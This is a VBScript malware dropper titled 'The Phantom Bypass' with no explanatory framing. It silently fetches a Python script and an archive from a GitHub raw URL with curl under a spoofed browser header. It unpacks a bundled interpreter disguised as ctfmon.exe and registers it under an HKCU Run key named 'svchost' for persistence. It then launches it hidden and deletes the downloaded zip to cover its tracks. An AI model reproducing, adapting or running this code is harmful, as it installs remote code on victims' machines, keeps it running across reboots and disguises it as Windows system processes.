' --- THE PHANTOM BYPASS (V16.4 - ANTI-404 MASTER) ---
On Error Resume Next

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

ID = "svchost"
Path = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\SystemStorage"
If Not fso.FolderExists(Path) Then fso.CreateFolder(Path)

' 1. LANDING PAYLOADS (Using CURL with Masked Headers)
C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

' Run curl hidden to land the files
shell.Run "curl -L -H ""User-Agent: Mozilla/5.0"" -o """ & Path & "\WinServices.py"" " & C_URL, 0, True
shell.Run "curl -L -H ""User-Agent: Mozilla/5.0"" -o """ & Path & "\mui_cache.zip"" " & Z_URL, 0, True

' 2. EXTRACTION
Set objShell = CreateObject("Shell.Application")
Set objSource = objShell.NameSpace(Path & "\mui_cache.zip")
Set objDest = objShell.NameSpace(Path)
objDest.CopyHere objSource.Items(), 16 + 4

' 3. PERSISTENCE
PY_EXE = Path & "\python\ctfmon.exe"
PY_SCRIPT = Path & "\WinServices.py"
RegKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & ID
shell.RegWrite RegKey, """" & PY_EXE & """ """ & PY_SCRIPT & """", "REG_SZ"

' 4. ENGAGE
shell.Run """" & PY_EXE & """ """ & PY_SCRIPT & """", 0, False
WScript.Sleep 5000
fso.DeleteFile(Path & "\mui_cache.zip")
